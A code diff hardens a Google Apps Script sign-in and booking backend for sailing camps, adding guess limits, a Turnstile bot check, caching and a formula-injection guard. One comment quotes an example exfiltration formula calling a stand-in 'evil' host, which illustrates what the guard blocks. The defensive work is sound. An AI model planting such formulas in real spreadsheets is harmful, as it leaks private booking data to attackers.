@@ -14,6 +14,15 @@ const MAX_CODE_ATTEMPTS = 5;
 const MAX_CODE_REQUESTS = 3; // per email per CODE_MINUTES
 const MAX_CODES_PER_HOUR = 40; // all emails together
 const MAIL_RESERVE = 25; // sign-in codes stop when the MailApp daily quota falls to this, keeping room for booking emails
+/* Security review 17 Nov 2026: cap wrong guesses per email across ALL its codes, not just per code.
+ * 10 wrong guesses per 6 hours ≈ 40 a day, so guessing a 6-digit code would take ~70 years on average. */
+const MAX_FAILS = 10;
+const FAIL_WINDOW_SECONDS = 6 * 3600; // CacheService maximum
+const CAMPS_CACHE_SECONDS = 60; // public camp list: a flood of page loads reads the sheet at most once a minute
+const SESSION_CACHE_SECONDS = 600; // a deleted session row stops working within 10 minutes
+/* Optional bot check (Cloudflare Turnstile) before a sign-in code is emailed. Off until the Script Property
+ * TURNSTILE_SECRET is set (Project Settings ▸ Script properties). Never put the secret in this file: the repo is public. */
+const TURNSTILE_VERIFY = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
 
 const TABS = {
   Bookings: ['booking_id', 'created', 'parent_email', 'sailor_id', 'sailor_name', 'camp_id', 'camp_title', 'amount', 'late_fee_applied', 'reference', 'payment_due', 'status', 'admin_notes'],
@@ -63,7 +72,7 @@ function doPost(e) {
 const ACTIONS = {
   /* Public */
   camps: () => publicCamps_(),
-  requestCode: req => requestCode_(req.email),
+  requestCode: req => requestCode_(req.email, req.human),
   verifyCode: req => verifyCode_(req.email, req.code),
 
   /* Signed in */
@@ -78,12 +87,15 @@ const ACTIONS = {
 
 /* ---------------- Sign-in (emailed 6-digit code) ---------------- */
 
-function requestCode_(email) {
+function requestCode_(email, human) {
   email = cleanEmail_(email);
   const cache = CacheService.getScriptCache();
   const key = 'req:' + email;
   const count = Number(cache.get(key) || 0);
   if (count >= MAX_CODE_REQUESTS) fail_('Too many codes requested. Please wait 15 minutes and try again.');
+  /* Bot check before anything is counted, so a script without a valid token can't use up the hourly cap
+   * below and lock real parents out of signing in. */
+  checkHuman_(human);
   /* Global cap so nobody can drain the MailApp daily quota with many addresses (booking emails need it too). */
   const hourKey = 'req:all:' + Utilities.formatDate(new Date(), TZ, 'yyyyMMddHH');
   const hourCount = Number(cache.get(hourKey) || 0);
@@ -110,14 +122,20 @@ function requestCode_(email) {
 function verifyCode_(email, code) {
   email = cleanEmail_(email);
   code = String(code || '').replace(/\D/g, '');
+  const cache = CacheService.getScriptCache();
+  const failKey = 'fail:' + email;
   return withLock_(() => {
+    const fails = Number(cache.get(failKey) || 0);
+    if (fails >= MAX_FAILS) fail_('Too many wrong codes for this email, so sign-in is paused for a few hours to keep the account safe. Please use the booking form or get in touch.', 'BUSY');
     const row = rows_('Codes').find(r => r.email === email);
     if (!row || new Date(row.expires) < new Date()) fail_('That code has expired. Please request a new one.');
     if (Number(row.attempts) >= MAX_CODE_ATTEMPTS) fail_('Too many attempts. Please request a new code.');
     if (hash_(email + ':' + code) !== row.code_hash) {
       update_('Codes', row._row, { attempts: Number(row.attempts) + 1 });
+      cache.put(failKey, String(fails + 1), FAIL_WINDOW_SECONDS);
       fail_('That code is not right. Please check the email and try again.');
     }
+    cache.remove(failKey);
     deleteRow_('Codes', row._row);
 
     const token = Utilities.getUuid() + Utilities.getUuid();
@@ -128,15 +146,27 @@ function verifyCode_(email, code) {
 }
 
 function auth_(req) {
-  const h = hash_(String(req.token || ''));
-  const s = req.token && rows_('Sessions').find(r => r.token_hash === h);
-  if (!s || new Date(s.expires) < new Date()) fail_('Please sign in again.', 'AUTH');
+  if (!req.token) fail_('Please sign in again.', 'AUTH');
+  const h = hash_(String(req.token));
+  /* Cached for a few minutes so each signed-in click doesn't re-read the whole Sessions tab. */
+  const cache = CacheService.getScriptCache();
+  const hit = cache.get('sess:' + h);
+  let s = hit ? JSON.parse(hit) : null;
+  if (!s) {
+    const row = rows_('Sessions').find(r => r.token_hash === h);
+    if (row) {
+      s = { email: row.email, expires: new Date(row.expires).getTime() };
+      cache.put('sess:' + h, JSON.stringify(s), SESSION_CACHE_SECONDS);
+    }
+  }
+  if (!s || !(s.expires > Date.now())) fail_('Please sign in again.', 'AUTH');
   return s.email;
 }
 
 function signOut_(token) {
   if (!token) return { signedOut: true };
   const h = hash_(String(token));
+  CacheService.getScriptCache().remove('sess:' + h);
   withLock_(() => rows_('Sessions').filter(r => r.token_hash === h).reverse().forEach(r => deleteRow_('Sessions', r._row)));
   return { signedOut: true };
 }
@@ -221,12 +251,19 @@ function deleteSailor_(email, id) {
 /* ---------------- Camps and booking ---------------- */
 
 function publicCamps_() {
+  /* Public and needs no sign-in, so it's the easiest request to flood: serve it from the cache for a minute.
+   * A booking clears the cache at once; edits made by hand in the Camps tab show within CAMPS_CACHE_SECONDS. */
+  const cache = CacheService.getScriptCache();
+  const hit = cache.get('camps');
+  if (hit) return JSON.parse(hit);
   const bookings = rows_('Bookings');
   const today = startOfDay_(new Date());
-  return rows_('Camps')
+  const list = rows_('Camps')
     .filter(c => c.camp_id && yes_(c.open) && new Date(c.end) >= today)
     .sort((a, b) => new Date(a.start) - new Date(b.start))
     .map(c => campOut_(c, bookings));
+  try { cache.put('camps', JSON.stringify(list), CAMPS_CACHE_SECONDS); } catch (err) { /* over 100 KB: skip caching */ }
+  return list;
 }
 
 function book_(email, campId, sailorIds) {
@@ -268,6 +305,7 @@ function book_(email, campId, sailorIds) {
     });
     return { camp, parent, sailors, created };
   });
+  CacheService.getScriptCache().remove('camps'); // places left changed
 
   try { sendBookingEmails_(result, s); } catch (err) { console.error('Booking email failed', err); }
   return {
@@ -713,14 +751,22 @@ function rows_(name) {
   if (sh.getLastRow() < 2) return [];
   const v = sh.getRange(1, 1, sh.getLastRow(), sh.getLastColumn()).getValues();
   const h = v.shift();
-  return v.map((r, i) => { const o = { _row: i + 2 }; h.forEach((k, j) => { o[k] = typeof r[j] === 'string' ? r[j].trim() : r[j]; }); return o; })
+  return v.map((r, i) => { const o = { _row: i + 2 }; h.forEach((k, j) => { o[k] = typeof r[j] === 'string' ? unsafeCell_(r[j].trim()) : r[j]; }); return o; })
     .filter(o => h.some(k => o[k] !== ''));
 }
-function append_(name, obj) { sh_(name).appendRow(headers_(name).map(k => (obj[k] === undefined ? '' : obj[k]))); }
+function append_(name, obj) { sh_(name).appendRow(headers_(name).map(k => (obj[k] === undefined ? '' : safeCell_(obj[k])))); }
 function update_(name, row, obj) {
   const h = headers_(name);
-  Object.keys(obj).forEach(k => { const c = h.indexOf(k); if (c > -1) sh_(name).getRange(row, c + 1).setValue(obj[k]); });
+  Object.keys(obj).forEach(k => { const c = h.indexOf(k); if (c > -1) sh_(name).getRange(row, c + 1).setValue(safeCell_(obj[k])); });
 }
+/* Formula-injection guard (security review 17 Nov 2026). Every value the script writes goes through here, so text
+ * a parent typed can never run as a formula (e.g. =IMAGE("https://evil/?"&A1) leaking the sheet) when James or Kai
+ * open it. A leading apostrophe makes Sheets keep the value as plain text. Phone numbers like "+44 7700 900123"
+ * contain no letters or brackets, so they are left alone. */
+const RISKY_CELL = /^[=@\t\r]|^[+-].*[^0-9\s().+-]/;
+function safeCell_(v) { return typeof v === 'string' && RISKY_CELL.test(v) ? "'" + v : v; }
+/* If Sheets kept the apostrophe as part of the text, drop it again when reading. */
+function unsafeCell_(v) { return v.charAt(0) === "'" && RISKY_CELL.test(v.slice(1)) ? v.slice(1) : v; }
 function deleteRow_(name, row) { sh_(name).deleteRow(row); }
 function colRange_(name, key) {
   const sh = sh_(name); const c = headers_(name).indexOf(key) + 1;
@@ -771,8 +817,23 @@ function hash_(s) { return Utilities.computeDigest(Utilities.DigestAlgorithm.SHA
 function shortId_() { return Utilities.getUuid().replace(/-/g, '').slice(0, 8).toUpperCase(); }
 function cleanEmail_(e) {
   e = String(e || '').trim().toLowerCase();
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e) || e.length > 120) fail_('Please enter a valid email address.');
+  /* Ordinary address characters only: no quotes, brackets or "=" a formula or an email header could use. */
+  if (!/^[a-z0-9_][a-z0-9._%+'-]*@[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}$/.test(e) || e.length > 120) fail_('Please enter a valid email address.');
   return e;
+}
+/* Cloudflare Turnstile check (see TURNSTILE_VERIFY). Does nothing until TURNSTILE_SECRET is set. Fails closed:
+ * if Cloudflare can't be reached, no code is sent, and the error offers the booking form. */
+function checkHuman_(token) {
+  const secret = PropertiesService.getScriptProperties().getProperty('TURNSTILE_SECRET');
+  if (!secret) return;
+  const msg = "We couldn't check you're not a robot. Please refresh the page and try again.";
+  if (!token) fail_(msg, 'BUSY');
+  let ok = false;
+  try {
+    const r = UrlFetchApp.fetch(TURNSTILE_VERIFY, { method: 'post', payload: { secret, response: String(token).slice(0, 2048) }, muteHttpExceptions: true });
+    ok = JSON.parse(r.getContentText()).success === true;
+  } catch (err) { console.error('Turnstile check failed', err); }
+  if (!ok) fail_(msg, 'BUSY');
 }
 function text_(v, max, required) {
   const t = String(v === undefined || v === null ? '' : v).trim().slice(0, max);
